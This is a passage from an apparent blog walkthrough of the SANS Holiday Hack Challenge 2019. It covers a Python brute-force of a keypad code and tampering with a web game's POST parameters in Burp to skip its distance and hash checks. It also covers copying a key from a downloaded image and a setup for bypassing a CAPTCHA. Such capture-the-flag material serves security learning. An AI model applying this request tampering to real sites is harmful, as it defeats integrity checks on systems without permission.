Kent you are so unfair. And we were going to make you the king of the
Winter Carnival.&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Kent:&lt;/strong&gt; You'll rue the day.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest (me):&lt;/strong&gt; Who talks like that?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Kent, you're the worst.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-7"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id24"&gt;Objective 7:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="the-dorm-room-s-keypad"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id25"&gt;The Dorm Room's Keypad&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;There's a keypad controlling the access to the elves' dorm room. Since it's
colde outside, the keys are a little bit frosty:&lt;/p&gt;
&lt;img alt="frosty_keypad.png" class="align-center" src="/images/sans-christmas-challenge-2019/frosty_keypad.png" /&gt;
&lt;p&gt;We can kind of make out the keys that are most used: 1, 3, and 7. &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Leet"&gt;Naturally&lt;/a&gt;,
I tried &lt;code&gt;1337&lt;/code&gt;, but this wasn't the right code.&lt;/p&gt;
&lt;p&gt;Luckily, Tangle Coalbox is here to provide us with clues.&lt;/p&gt;
&lt;img alt="tangle_coalbox.png" class="align-center" src="/images/sans-christmas-challenge-2019/tangle_coalbox.png" /&gt;
&lt;p&gt;&lt;em&gt;Tangle Coalbox says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hey kid, it's me, Tangle Coalbox.&lt;/p&gt;
&lt;p&gt;I'm sleuthing again, and I could use your help.&lt;/p&gt;
&lt;p&gt;Ya see, this here number lock's been popped by someone.&lt;/p&gt;
&lt;p&gt;I think I know who, but it'd sure be great if you could open this up for me.&lt;/p&gt;
&lt;p&gt;I've got a few clues for you.&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;One digit is repeated once.&lt;/li&gt;
&lt;li&gt;The code is a prime number.&lt;/li&gt;
&lt;li&gt;You can probably tell by looking at the keypad which buttons are used.&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;Alright, we were on the right track: we can see which buttons are used, and our
first code had indeed one digit repeated once. However, 1337 is &lt;a class="reference external" href="https://www.isprimenumber.com/prime/1337"&gt;not a prime
number&lt;/a&gt;. So, let's code a little
script that will generate potential candidates. I used Python, with the
&lt;a class="reference external" href="https://www.sympy.org/en/index.html"&gt;sympy&lt;/a&gt; library to test primality:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;permutations&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sympy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;isprime&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# These are our three digits&lt;/span&gt;
    &lt;span class="n"&gt;base_digits&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;137&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;valid_candidates&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;base_digits&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# We create a string with four digits, by repeating each digit once&lt;/span&gt;
        &lt;span class="n"&gt;doubled_digits&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base_digits&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;permutations&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;doubled_digits&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;candidate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;isprime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;candidate&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="n"&gt;valid_candidates&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;candidate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;valid_candidates&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./frost_key_pad.py
&lt;span class="m"&gt;1373&lt;/span&gt;
&lt;span class="m"&gt;3371&lt;/span&gt;
&lt;span class="m"&gt;7331&lt;/span&gt;
&lt;span class="m"&gt;3137&lt;/span&gt;
&lt;span class="m"&gt;1733&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have only five candidates. By trying them each one by one, we find that
the correct code is &lt;code&gt;7331&lt;/code&gt; (which is &lt;code&gt;1337&lt;/code&gt; backwards, might have
found it with a little bit of guessing).&lt;/p&gt;
&lt;img alt="keypad_code.gif" class="align-center" src="/images/sans-christmas-challenge-2019/keypad_code.gif" /&gt;
&lt;/div&gt;
&lt;div class="section" id="minty-candy-cane-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id26"&gt;Minty Candy Cane's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We have an old video game that we must beat:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to the Trail! It's nearly time for Kringlecon. You need to get
there before the 25th day of December! Hitch up your reindeer, gather your
supplies, and do your best to make it to the North Pole on time.&lt;/p&gt;
&lt;p&gt;Good luck!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There are three difficulty level, easy, medium, and hard.&lt;/p&gt;
&lt;p&gt;Now, let's select the easy mode, and start playing:&lt;/p&gt;
&lt;img alt="trail_easy_distance_0.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_easy_distance_0.png" /&gt;
&lt;p&gt;Hmm, we can see a &lt;code&gt;distance&lt;/code&gt; parameter in the URL. We also see that we
have a remaining distance of 8000. What happends if we modify the
&lt;code&gt;distance&lt;/code&gt; parameter in the URL?&lt;/p&gt;
&lt;img alt="trail_easy_distance_1.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_easy_distance_1.png" /&gt;
&lt;p&gt;Well, if we put &lt;code&gt;distance=1&lt;/code&gt;, we can see that the remaining distance is
7999. So, let's put &lt;code&gt;distance=8000&lt;/code&gt; and press GO:&lt;/p&gt;
&lt;img alt="trail_easy_distance_8000.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_easy_distance_8000.png" /&gt;
&lt;p&gt;Alright, that &lt;em&gt;was&lt;/em&gt; easy! Let's try the medium mode:&lt;/p&gt;
&lt;img alt="trail_medium_distance_0.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_medium_distance_0.png" /&gt;
&lt;p&gt;So, no parameter in the URL. Let's launch Burp, and see what happens if we
press GO:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/trail/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;416&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail-mix-cookie=fd1ec9a9109e6fd09265795ccebab2d65473a9d2&lt;/span&gt;

pace=0&amp;amp;playerid=JebediahSpringfield&amp;amp;action=go&amp;amp;difficulty=1&amp;amp;money=3000&amp;amp;distance=0&amp;amp;curmonth=8&amp;amp;curday=1&amp;amp;name0=Jane&amp;amp;health0=100&amp;amp;cond0=0&amp;amp;cause0=&amp;amp;deathday0=0&amp;amp;deathmonth0=0&amp;amp;name1=Anna&amp;amp;health1=100&amp;amp;cond1=0&amp;amp;cause1=&amp;amp;deathday1=0&amp;amp;deathmonth1=0&amp;amp;name2=Vlad&amp;amp;health2=100&amp;amp;cond2=0&amp;amp;cause2=&amp;amp;deathday2=0&amp;amp;deathmonth2=0&amp;amp;name3=Vlad&amp;amp;health3=100&amp;amp;cond3=0&amp;amp;cause3=&amp;amp;deathday3=0&amp;amp;deathmonth3=0&amp;amp;reindeer=2&amp;amp;runners=2&amp;amp;ammo=50&amp;amp;meds=10&amp;amp;food=200&amp;amp;hash=HASH
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, the &lt;code&gt;distance&lt;/code&gt; parameter is not in the URL anymore, it's sent by
&lt;code&gt;POST&lt;/code&gt;. So, let's press the GO button once more, intercept the request
in Burp, and change the &lt;code&gt;distance&lt;/code&gt; value to 8000:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/trail/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;416&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail-mix-cookie=fd1ec9a9109e6fd09265795ccebab2d65473a9d2&lt;/span&gt;

pace=0&amp;amp;playerid=JebediahSpringfield&amp;amp;action=go&amp;amp;difficulty=1&amp;amp;money=3000&amp;amp;distance=8000&amp;amp;curmonth=8&amp;amp;curday=1&amp;amp;name0=Jane&amp;amp;health0=100&amp;amp;cond0=0&amp;amp;cause0=&amp;amp;deathday0=0&amp;amp;deathmonth0=0&amp;amp;name1=Anna&amp;amp;health1=100&amp;amp;cond1=0&amp;amp;cause1=&amp;amp;deathday1=0&amp;amp;deathmonth1=0&amp;amp;name2=Vlad&amp;amp;health2=100&amp;amp;cond2=0&amp;amp;cause2=&amp;amp;deathday2=0&amp;amp;deathmonth2=0&amp;amp;name3=Vlad&amp;amp;health3=100&amp;amp;cond3=0&amp;amp;cause3=&amp;amp;deathday3=0&amp;amp;deathmonth3=0&amp;amp;reindeer=2&amp;amp;runners=2&amp;amp;ammo=50&amp;amp;meds=10&amp;amp;food=200&amp;amp;hash=HASH
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="trail_medium_distance_8000.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_medium_distance_8000.png" /&gt;
&lt;p&gt;Not too bad! Now, let's try the hard mode.&lt;/p&gt;
&lt;p&gt;The hard mode works the same as the medium mode however, there is a
verification hash that is used to verify that we did not modify the state, as
we did previously. Here's the original request:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/trail/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;452&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail-mix-cookie=f2a856a1e116d4c8e20dac88f31505dba60e7a17&lt;/span&gt;

pace=0&amp;amp;playerid=JebediahSpringfield&amp;amp;action=go&amp;amp;difficulty=2&amp;amp;money=1500&amp;amp;distance=0&amp;amp;curmonth=9&amp;amp;curday=1&amp;amp;name0=Emmanuel&amp;amp;health0=100&amp;amp;cond0=0&amp;amp;cause0=&amp;amp;deathday0=0&amp;amp;deathmonth0=0&amp;amp;name1=Lila&amp;amp;health1=100&amp;amp;cond1=0&amp;amp;cause1=&amp;amp;deathday1=0&amp;amp;deathmonth1=0&amp;amp;name2=Mathias&amp;amp;health2=100&amp;amp;cond2=0&amp;amp;cause2=&amp;amp;deathday2=0&amp;amp;deathmonth2=0&amp;amp;name3=Joseph&amp;amp;health3=100&amp;amp;cond3=0&amp;amp;cause3=&amp;amp;deathday3=0&amp;amp;deathmonth3=0&amp;amp;reindeer=2&amp;amp;runners=2&amp;amp;ammo=10&amp;amp;meds=2&amp;amp;food=100&amp;amp;hash=bc573864331a9e42e4511de6f678aa83
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, let's see what happens it we try to modify the &lt;code&gt;distance&lt;/code&gt; parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/trail/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;452&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail-mix-cookie=f2a856a1e116d4c8e20dac88f31505dba60e7a17&lt;/span&gt;

pace=0&amp;amp;playerid=JebediahSpringfield&amp;amp;action=go&amp;amp;difficulty=2&amp;amp;money=1500&amp;amp;distance=8000&amp;amp;curmonth=9&amp;amp;curday=1&amp;amp;name0=Emmanuel&amp;amp;health0=100&amp;amp;cond0=0&amp;amp;cause0=&amp;amp;deathday0=0&amp;amp;deathmonth0=0&amp;amp;name1=Lila&amp;amp;health1=100&amp;amp;cond1=0&amp;amp;cause1=&amp;amp;deathday1=0&amp;amp;deathmonth1=0&amp;amp;name2=Mathias&amp;amp;health2=100&amp;amp;cond2=0&amp;amp;cause2=&amp;amp;deathday2=0&amp;amp;deathmonth2=0&amp;amp;name3=Joseph&amp;amp;health3=100&amp;amp;cond3=0&amp;amp;cause3=&amp;amp;deathday3=0&amp;amp;deathmonth3=0&amp;amp;reindeer=2&amp;amp;runners=2&amp;amp;ammo=10&amp;amp;meds=2&amp;amp;food=100&amp;amp;hash=bc573864331a9e42e4511de6f678aa83
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 12 Jan 2020 21:35:13 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;198&lt;/span&gt;
&lt;span class="na"&gt;Set-Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;trail-mix-cookie=8dc362d86d212e4032987287943a7b0f1c569ef1; expires=Mon, 13 Jan 2020 00:35:13 GMT; HttpOnly; Max-Age=10800; Path=/&lt;/span&gt;

&lt;span class="hll"&gt;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Fail&amp;lt;/title&amp;gt;&amp;lt;body style=&amp;#39;background-color:black;&amp;#39;&amp;gt;&amp;lt;font color=&amp;#39;white&amp;#39;&amp;gt;Sorry, something&amp;#39;s just not right about your status: badHash&amp;lt;br&amp;gt;You have fallen off the trail.&amp;amp;trade;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Well, we can't modify the parameters anymore, they are checked. Or, are they?
By trying to modify different parameters, we can see which ones are checked in
the hash parameter. For example, we can't modify the distance, or our money.
But the reindeers' health is not checked. So, we can modify their health, so
that our reindeers is always to the max. We can use Burp's match and replace
functionality to do so:&lt;/p&gt;
&lt;img alt="trail_burp_match_replace.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_burp_match_replace.png" /&gt;
&lt;p&gt;Now, we can set the pace to &amp;quot;Grueling&amp;quot;, and keep progressing, and travel the
whole distance:&lt;/p&gt;
&lt;img alt="trail_hard_distance_8000.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_hard_distance_8000.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="get-access-to-the-steam-tunnels"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id27"&gt;Get Access To The Steam Tunnels&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;When we get inside an elf's room, we see a weird looking guy running away:&lt;/p&gt;
&lt;img alt="dorm_krampus_running_away.gif" class="align-center" src="/images/sans-christmas-challenge-2019/dorm_krampus_running_away.gif" /&gt;
&lt;p&gt;We follow him into the closet, but we're face to a closed door, with a key ring
and a key hole. If we snoop around the room, we find a weird looking machine,
with six dials and a &amp;quot;Cut&amp;quot; button. Let's try something:&lt;/p&gt;
&lt;img alt="key_cutter.png" class="align-center" src="/images/sans-christmas-challenge-2019/key_cutter.png" /&gt;
&lt;p&gt;Alright! It's a key cutter. We can cut a key with different notch size.&lt;/p&gt;
&lt;img alt="001337.png" class="align-center" src="/images/sans-christmas-challenge-2019/001337.png" /&gt;
&lt;p&gt;If we manage to get a glimpse of the key opening the door in the closet, we can
cut a copy, and then open the door. But where can we see the key?&lt;/p&gt;
&lt;p&gt;Looking back at the guy that ran away, we can see that he has a key dangling
from his belt. But he's running away fast, how can we get a good look at the
key? Well, we can use our browser's developer tools, head over to the &amp;quot;Network&amp;quot;
tab, and see the image of our guy being downloaded:&lt;/p&gt;
&lt;img alt="browser_network_panel_krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/browser_network_panel_krampus.png" /&gt;
&lt;p&gt;Let's download our &lt;code&gt;krampus.png&lt;/code&gt;:&lt;/p&gt;
&lt;a class="reference external image-reference" href="/images/sans-christmas-challenge-2019/krampus.png"&gt;&lt;img alt="krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" /&gt;&lt;/a&gt;
&lt;p&gt;Now, we can open this image in our favorite image editor, and zoom in on the
key:&lt;/p&gt;
&lt;img alt="krampus_key_notches.png" class="align-center" src="/images/sans-christmas-challenge-2019/krampus_key_notches.png" /&gt;
&lt;p&gt;We can clearly see the six notches in this key. But how deep are they? We can
infer a couple of guesses:&lt;/p&gt;
&lt;img alt="krampus_key_notches_depth.png" class="align-center" src="/images/sans-christmas-challenge-2019/krampus_key_notches_depth.png" /&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Notch #6 seems to be of depth zero. We can determine this by cutting trial
keys on the key cutter.&lt;/li&gt;
&lt;li&gt;Notch #1 seems to be one depth unit less than notch #2, but one depth unit
more than notch #6.&lt;/li&gt;
&lt;li&gt;Notches #2, 3, and 5, seem to be the same depth.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So, we can then venture that:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Notch # 1 is depth 1&lt;/li&gt;
&lt;li&gt;Notches #2, 3, and 5 are depth 2&lt;/li&gt;
&lt;li&gt;Notch #6 is depth 0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There is still some uncertainty regarding notch #4. It seems to be three or
four depth unit more than notch #2, which would make it 5 or 6. We can generate
both keys and try them both. Turns out that the correct key is &lt;code&gt;122520&lt;/code&gt;:&lt;/p&gt;
&lt;img alt="122520.png" class="align-center" src="/images/sans-christmas-challenge-2019/122520.png" /&gt;
&lt;p&gt;We can now enter the steam tunnels, where we can find our runaway guy:&lt;/p&gt;
&lt;img alt="small_krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" /&gt;
&lt;p&gt;&lt;em&gt;Krampus says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hello there! I’m Krampus Hollyfeld.&lt;/p&gt;
&lt;p&gt;I maintain the steam tunnels underneath Elf U,&lt;/p&gt;
&lt;p&gt;Keeping all the elves warm and jolly.&lt;/p&gt;
&lt;p&gt;Though I spend my time in the tunnels and smoke,&lt;/p&gt;
&lt;p&gt;In this whole wide world, there's no happier bloke!&lt;/p&gt;
&lt;p&gt;Yes, I borrowed Santa’s turtle doves for just a bit.&lt;/p&gt;
&lt;p&gt;Someone left some scraps of paper near that fireplace, which is a big fire
hazard.&lt;/p&gt;
&lt;p&gt;I sent the turtle doves to fetch the paper scraps.&lt;/p&gt;
&lt;p&gt;But, before I can tell you more, I need to know that I can trust you.&lt;/p&gt;
&lt;p&gt;Tell you what – if you can help me beat the &lt;a class="reference external" href="https://fridosleigh.com/"&gt;Frido Sleigh&lt;/a&gt;
contest (Objective 8), then I'll know I can trust you.&lt;/p&gt;
&lt;p&gt;The contest is here on my screen and at &lt;a class="reference external" href="https://fridosleigh.com/"&gt;fridosleigh.com&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;No purchase necessary, enter as often as you want, so I am!&lt;/p&gt;
&lt;p&gt;They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.&lt;/p&gt;
&lt;p&gt;Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA.&lt;/p&gt;
&lt;p&gt;(That's Completely Automated Public Turing test to tell Elves and Humans Apart.)&lt;/p&gt;
&lt;p&gt;I've already cataloged &lt;a class="reference external" href="https://downloads.elfu.org/capteha_images.tar.gz"&gt;12,000 images&lt;/a&gt;
and decoded the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/capteha_api.py"&gt;API interface&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Can you help me bypass the CAPTEHA and submit lots of entries?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-8"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id28"&gt;Objective 8:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="alabaster-snowball-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id29"&gt;Alabaster Snowball's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Alabaster has a custom nyancat shell, but we're supposed to log into his
account and launch a regulard &lt;code&gt;bash&lt;/code&gt; prompt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░&lt;/span&gt;
&lt;span class="go"&gt;░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░&lt;/span&gt;
&lt;span class="go"&gt;░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░&lt;/span&gt;
&lt;span class="go"&gt;░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░&lt;/span&gt;
&lt;span class="go"&gt;░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░&lt;/span&gt;
&lt;span class="go"&gt;░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░&lt;/span&gt;

&lt;span class="go"&gt;nyancat, nyancat&lt;/span&gt;
&lt;span class="go"&gt;I love that nyancat!&lt;/span&gt;
&lt;span class="go"&gt;My shell&amp;#39;s stuffed inside one&lt;/span&gt;
&lt;span class="go"&gt;Whatcha&amp;#39; think about that?&lt;/span&gt;

&lt;span class="go"&gt;Sadly now, the day&amp;#39;s gone&lt;/span&gt;
&lt;span class="go"&gt;Things to do!  Without one...&lt;/span&gt;
&lt;span class="go"&gt;I&amp;#39;ll miss that nyancat&lt;/span&gt;
